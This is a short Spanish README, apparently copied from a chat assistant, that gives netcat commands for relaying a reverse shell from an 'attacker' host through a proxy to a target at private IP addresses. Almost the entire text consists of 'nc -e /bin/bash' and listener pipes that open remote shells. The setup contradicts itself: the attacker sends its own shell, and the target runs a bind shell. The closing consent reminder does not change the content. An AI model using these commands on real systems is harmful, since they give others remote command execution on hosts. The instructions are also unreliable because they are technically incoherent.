README - Configuración de Reverse Shell a través de Proxy
Este README proporciona instrucciones sobre cómo configurar una reverse shell desde una máquina atacante a través de un proxy hacia una máquina final.

Configuración
Máquinas involucradas:
Máquina atacante: 172.32.84.192
Proxy: 172.31.84.193
Máquina final: 172.31.84.35
Pasos para la configuración:
Máquina atacante (172.32.84.192):

Ejecuta el siguiente comando para establecer una conexión a través del proxy y enviar la shell inversa:

bash
Copy code
nc -e /bin/bash 172.31.84.193 443 | nc -v 172.31.84.35 12345
Proxy (172.31.84.193):

Ejecuta el siguiente comando para escuchar en el puerto 443 y redirigir el tráfico entrante a la máquina final:

bash
Copy code
nc -lvp 443 | nc -v 172.31.84.35 12345
Máquina final (172.31.84.35):

Configura un listener para recibir la conexión entrante en el puerto 12345:

bash
Copy code
nc -lvp 12345 -e /bin/bash
Notas importantes:
Asegúrate de tener permisos adecuados y contar con el consentimiento del propietario del sistema antes de realizar este tipo de acciones.
La seguridad ética y responsable es esencial en todas las actividades relacionadas con la seguridad informática.
